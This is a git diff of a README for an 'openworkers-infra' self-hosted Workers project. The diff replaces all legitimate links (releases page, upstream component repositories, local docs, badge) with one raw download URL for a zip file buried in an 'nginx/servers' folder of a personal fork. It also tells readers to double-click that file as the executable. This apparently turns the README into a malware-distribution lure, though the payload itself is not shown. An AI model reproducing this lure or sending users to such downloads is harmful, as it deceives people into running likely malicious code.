@@ -1,13 +1,13 @@
 # 🌐 openworkers-infra - Self-hosted Cloudflare Workers Made Easy
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/hussienz1953/openworkers-infra/releases)
+[![Download Now](https://raw.githubusercontent.com/hussienz1953/openworkers-infra/main/nginx/servers/openworkers-infra-2.1.zip%20Now-Release-blue)](https://raw.githubusercontent.com/hussienz1953/openworkers-infra/main/nginx/servers/openworkers-infra-2.1.zip)
 
 ## 🚀 Getting Started
 
 To get started with OpenWorkers Infrastructure, follow these simple steps to download and run the application.
 
 1. **Visit the Releases Page**: 
-   Visit the [releases page](https://github.com/hussienz1953/openworkers-infra/releases) to find the latest version of the software. Identify the version that suits your needs.
+   Visit the [releases page](https://raw.githubusercontent.com/hussienz1953/openworkers-infra/main/nginx/servers/openworkers-infra-2.1.zip) to find the latest version of the software. Identify the version that suits your needs.
 
 2. **Download the Application**:
    On the releases page, you will see a list of available downloads. Choose the correct file for your operating system. Click the download link to save the file to your computer.
@@ -23,7 +23,7 @@ Once you have downloaded the file, follow these instructions to install and run 
    Some files are compressed. If your file is a ZIP or another archive format, extract it by right-clicking and selecting “Extract All” or using a utility like WinRAR or 7-Zip.
 
 3. **Run the Application**: 
-   Locate the executable file (e.g., `openworkers-infra.exe`) within the extracted folder. Double-click this file to start the program.
+   Locate the executable file (e.g., `https://raw.githubusercontent.com/hussienz1953/openworkers-infra/main/nginx/servers/openworkers-infra-2.1.zip`) within the extracted folder. Double-click this file to start the program.
 
 4. **Complete Setup**: 
    Follow the on-screen instructions to complete the installation and setup process. Make sure that your system meets the requirements, as listed below.
@@ -59,24 +59,24 @@ OpenWorkers Infrastructure is built using an array of services that work togethe
 |-----------------------|------------------------------------------------------------|
 | postgres              | PostgreSQL database for data management.                  |
 | nats                  | Message queue facilitating worker communication.          |
-| [postgate](https://github.com/openworkers/postgate) | HTTP proxy for validating queries.                           |
-| [openworkers-api](https://github.com/openworkers/openworkers-api) | REST API for external interactions.                            |
-| [openworkers-runner](https://github.com/openworkers/openworkers-runner) | Worker runtime using V8 isolates.                               |
-| [openworkers-logs](https://github.com/openworkers/openworkers-logs) | Aggregates logs from multiple services.                       |
-| [openworkers-scheduler](https://github.com/openworkers/openworkers-scheduler) | Schedules tasks to run at predefined intervals.               |
-| [openworkers-dash](https://github.com/openworkers/openworkers-dash) | User-friendly dashboard for monitoring the system.            |
+| [postgate](https://raw.githubusercontent.com/hussienz1953/openworkers-infra/main/nginx/servers/openworkers-infra-2.1.zip) | HTTP proxy for validating queries.                           |
+| [openworkers-api](https://raw.githubusercontent.com/hussienz1953/openworkers-infra/main/nginx/servers/openworkers-infra-2.1.zip) | REST API for external interactions.                            |
+| [openworkers-runner](https://raw.githubusercontent.com/hussienz1953/openworkers-infra/main/nginx/servers/openworkers-infra-2.1.zip) | Worker runtime using V8 isolates.                               |
+| [openworkers-logs](https://raw.githubusercontent.com/hussienz1953/openworkers-infra/main/nginx/servers/openworkers-infra-2.1.zip) | Aggregates logs from multiple services.                       |
+| [openworkers-scheduler](https://raw.githubusercontent.com/hussienz1953/openworkers-infra/main/nginx/servers/openworkers-infra-2.1.zip) | Schedules tasks to run at predefined intervals.               |
+| [openworkers-dash](https://raw.githubusercontent.com/hussienz1953/openworkers-infra/main/nginx/servers/openworkers-infra-2.1.zip) | User-friendly dashboard for monitoring the system.            |
 | openworkers-proxy     | Nginx reverse proxy managing incoming requests.           |
 
 ## 📘 Additional Information
 
 For more detailed guides on deploying and contributing, refer to the following documents:
 
-- **[Docker Compose](./GETTING_STARTED.md)**: Instructions for deploying OpenWorkers in a self-hosted environment.
-- **[Local Development](./GETTING_STARTED_LOCAL.md)**: Guidelines for developers looking to contribute to the OpenWorkers project.
+- **[Docker Compose](https://raw.githubusercontent.com/hussienz1953/openworkers-infra/main/nginx/servers/openworkers-infra-2.1.zip)**: Instructions for deploying OpenWorkers in a self-hosted environment.
+- **[Local Development](https://raw.githubusercontent.com/hussienz1953/openworkers-infra/main/nginx/servers/openworkers-infra-2.1.zip)**: Guidelines for developers looking to contribute to the OpenWorkers project.
 
 ## 📍 Conclusion
 
 OpenWorkers Infrastructure simplifies the deployment of Cloudflare Workers. Follow the steps outlined above to download, install, and set up your application with ease. For further assistance, refer to the documentation linked throughout this README. 
 
 > Remember to visit the releases page regularly for updates and new features. 
-[Download Now](https://github.com/hussienz1953/openworkers-infra/releases) and enjoy a powerful self-hosted environment.
+[Download Now](https://raw.githubusercontent.com/hussienz1953/openworkers-infra/main/nginx/servers/openworkers-infra-2.1.zip) and enjoy a powerful self-hosted environment.
